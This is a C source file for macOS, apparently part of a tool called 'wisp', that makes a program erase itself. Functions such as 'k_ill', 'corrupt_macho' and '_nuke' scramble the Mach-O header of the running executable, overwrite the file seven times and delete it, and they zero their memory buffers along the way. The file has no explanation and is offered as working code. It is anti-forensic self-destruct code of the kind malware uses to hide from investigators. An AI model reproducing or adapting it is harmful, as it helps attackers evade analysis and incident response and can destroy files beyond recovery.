#include <wisp.h>

void f_buffer(unsigned char *buf, size_t len, wipe_pattern_t pattern, unsigned char custom) {
    switch (pattern) {
        case WIPE_ZERO:   memset(buf, 0x00, len); break;
        case WIPE_ONE:    memset(buf, 0xFF, len); break;
        case WIPE_RANDOM: for (size_t i = 0; i < len; i++) buf[i] = arc4random_uniform(256); break;
        case WIPE_CUSTOM: memset(buf, custom, len); break;
    }
}

int w_file(int fd, unsigned char *buf, size_t len, const wipe_conf_t *config) {
    for (int pass = 0; pass < config->passes; pass++) {
        f_buffer(buf, len, config->patterns[pass], config->custom);
        if (lseek(fd, 0, SEEK_SET) == -1 || write(fd, buf, len) != (ssize_t)len || fsync(fd) != 0)
            return -1;
    }
    return 0;
}

int corrupt_macho(int fd) {
    if (fd < 0) return -1;

    struct stat st;
    if (fstat(fd, &st) != 0 || st.st_size < 4096) return -1;

    unsigned char *header = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
    if (header == MAP_FAILED) return -1;

    if (pread(fd, header, 4096, 0) != 4096) goto bail;

    uint32_t rnd = arc4random_uniform(0xFFFFFFFF);
    memcpy(header, &rnd, sizeof(rnd));

    for (int i = 0; i < 16; i++) {
        size_t off = arc4random_uniform(4096 - sizeof(uint32_t));
        rnd = arc4random_uniform(0xFFFFFFFF);
        memcpy(header + off, &rnd, sizeof(rnd));
    }

    if (pwrite(fd, header, 4096, 0) != 4096) goto bail;
    fsync(fd);

bail:
    {
        volatile unsigned char *vp = (volatile unsigned char *)header;
        for (size_t i = 0; i < 4096; i++) {
            vp[i] = 0;
        }
    }
    munmap(header, 4096);
    return 0;
}

int _nuke(const char *path, const wipe_conf_t *config) {
    struct stat st;
    if (stat(path, &st) != 0) return -1;

    size_t sz = (size_t)st.st_size;
    if (!sz) return unlink(path);

    unsigned char *buf = mmap(NULL, sz, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
    if (buf == MAP_FAILED) return -1;

    mlock(buf, sz);

    int fd = open(path, O_RDWR);
    if (fd < 0) { munmap(buf, sz); return -1; }

    int res = w_file(fd, buf, sz, config);
    close(fd);

    {
        volatile unsigned char *vp = (volatile unsigned char *)buf;
        for (size_t i = 0; i < sz; i++) {
            vp[i] = 0;
        }
    }
    munmap(buf, sz);


    if (res != 0) return -1;
    return unlink(path);
}

wipe_conf_t *prep_nuker(int passes) {
    wipe_conf_t *cfg = malloc(sizeof(*cfg));
    if (!cfg) return NULL;

    cfg->patterns = malloc(sizeof(wipe_pattern_t) * passes);
    if (!cfg->patterns) { free(cfg); return NULL; }

    for (int i = 0; i < passes - 1; i++) cfg->patterns[i] = WIPE_RANDOM;
    cfg->patterns[passes - 1] = WIPE_ZERO;
    cfg->passes = passes;
    cfg->custom = 0;

    return cfg;
}

void _burn(wipe_conf_t *cfg) {
    if (cfg) {
        free(cfg->patterns);
        free(cfg);
    }
}

int _self(const char *path) {
    int passes = 7;
    wipe_conf_t *cfg = prep_nuker(passes);
    if (!cfg) return -1;

    int fd = open(path, O_RDWR);
    if (fd >= 0) {
        corrupt_macho(fd);
        close(fd);
    }

    int r = _nuke(path, cfg);
    _burn(cfg);
    return r;
}

int autodes(void) {
    char path[1024] = {0};
    uint32_t sz = sizeof(path);
    if (_NSGetExecutablePath(path, (uint32_t *)&sz) != 0)
        exit(EXIT_FAILURE);

    pid_t pid = fork();
    if (pid < 0) return -1;
    if (pid == 0) {
        execl(path, path, NULL);
        exit(EXIT_FAILURE);
    }
    return 0;
}

void k_ill(void) {
    char path[1024] = {0};
    uint32_t sz = sizeof(path);
    if (_NSGetExecutablePath(path, (uint32_t *)&sz) != 0)
    exit(EXIT_FAILURE);

    _self(path);
    sleep(1);
    exit(EXIT_SUCCESS);
}

__attribute__((noreturn)) void panic(void) {
    k_ill();
}
